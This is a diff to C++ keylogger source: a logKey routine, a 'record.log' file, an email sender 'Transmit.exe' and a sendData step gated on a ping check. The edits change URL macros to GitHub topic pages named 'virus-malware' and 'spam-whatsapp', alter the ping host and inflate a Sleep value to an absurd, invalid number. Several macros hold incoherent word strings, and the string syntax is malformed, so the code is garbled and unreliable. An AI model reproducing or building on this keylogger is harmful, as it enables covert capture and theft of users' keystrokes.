@@ -19,7 +19,7 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME “https://github.com/topics/whatsapp-retricts/forks"."https://github.com/Google/china/opensource/Download_system/forks"."https://github.com/google/gemini-cli/disable-account/forks"."https://github.com/topics/whatsapp-ban/forks"
+#define RUN_Link_NAME “https://github.com/topics/virus-malware/forks"."https://github.com/topics/spam-whatsapp/forks"
 #define INFECT_Link_NAME "https://www.whatsapp.com/?lang=id"."https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.whatsapps.co.in -n 1")){ ///check! connection
+            if(!system("ping  www.whatsapps.co.id -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -181,7 +181,7 @@ void logKey(){
                     fclose(file);
                 }
             }
-            Sleep(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999000); ///take rest
+            Sleep(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999000); ///take rest
         }
         j++;
     }
